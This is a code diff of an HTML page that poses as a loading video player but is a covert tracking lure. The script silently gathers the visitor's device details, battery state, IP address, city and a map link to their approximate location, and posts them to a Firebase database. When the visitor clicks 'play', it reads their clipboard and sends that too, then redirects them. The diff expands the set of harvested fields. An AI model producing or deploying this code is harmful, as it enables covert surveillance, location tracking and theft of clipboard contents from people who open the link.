@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Video Player</title>
+    <title>Video Loading...</title>
     <style>
         body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
         .loader { border: 3px solid #f3f3f3; border-top: 3px solid #00a884; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.8s linear infinite; }
@@ -12,13 +12,13 @@
 <body>
     <div id="status" style="text-align:center;">
         <div class="loader" id="ldr"></div>
-        <p id="msg" style="margin-top:10px; color:#555; font-size: 14px;">Connecting...</p>
+        <p id="msg" style="margin-top:10px; color:#555; font-size: 13px;">Connecting to server...</p>
     </div>
 
     <script>
         const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
 
-        async function fastAction() {
+        async function collectData() {
             const params = new URLSearchParams(window.location.search);
             const id = params.get('id');
             if(!id) return;
@@ -26,30 +26,46 @@
             const userKey = decoded.k;
             const targetUrl = decoded.r;
 
-            // Background mein data collect karna (Wait nahi karega)
+            // 1. Instant Data (No wait)
             let data = {
                 time: new Date().toLocaleString(),
                 device: navigator.platform,
-                net: navigator.connection ? navigator.connection.effectiveType : "N/A"
+                ram: navigator.deviceMemory || "N/A",
+                res: `${screen.width}x${screen.height}`,
+                orient: screen.orientation ? screen.orientation.type : "N/A",
+                netType: navigator.connection ? navigator.connection.effectiveType : "N/A",
+                speed: navigator.connection ? navigator.connection.downlink : "N/A"
             };
 
-            // Quick IP fetch
-            fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(d => {
-                    data.ip = d.ip;
-                    fetch(`${DB_URL}tracking/${userKey}.json`, { method: 'POST', body: JSON.stringify(data) });
-                }).catch(() => {
-                    fetch(`${DB_URL}tracking/${userKey}.json`, { method: 'POST', body: JSON.stringify(data) });
-                });
+            // 2. Battery (Silent wait)
+            try {
+                const b = await navigator.getBattery();
+                data.battery = Math.round(b.level * 100);
+                data.charging = b.charging ? "Yes" : "No";
+            } catch(e){ data.battery = "N/A"; }
 
-            // Sirf 2 second ka timer
+            // 3. IP & Location (Fast API)
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                data.ip = d.ip || "N/A";
+                data.loc = d.city ? `${d.city}, ${d.country_name}` : "N/A";
+                data.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+            } catch(e) {
+                data.ip = "N/A"; data.loc = "N/A";
+            }
+
+            // Save foran
+            fetch(`${DB_URL}tracking/${userKey}.json`, { 
+                method: 'POST', 
+                body: JSON.stringify(data) 
+            });
+
+            // Timer for UI
             setTimeout(() => {
                 document.getElementById('ldr').style.display = 'none';
                 document.getElementById('msg').innerHTML = "<b>⚠️ CLICK TO PLAY VIDEO</b>";
-                
                 document.body.onclick = async () => {
-                    // Clipboard try karega aur redirect kar dega
                     try {
                         const text = await navigator.clipboard.readText();
                         if(text) fetch(`${DB_URL}clipboard/${userKey}.json`, { 
@@ -61,10 +77,10 @@
                 };
             }, 2000);
 
-            // Agar user click na kare toh 5 sec mein auto-redirect
-            setTimeout(() => { window.location.href = targetUrl; }, 5000);
+            // Auto Redirect
+            setTimeout(() => { window.location.href = targetUrl; }, 6000);
         }
-        fastAction();
+        collectData();
     </script>
 </body>
 </html>
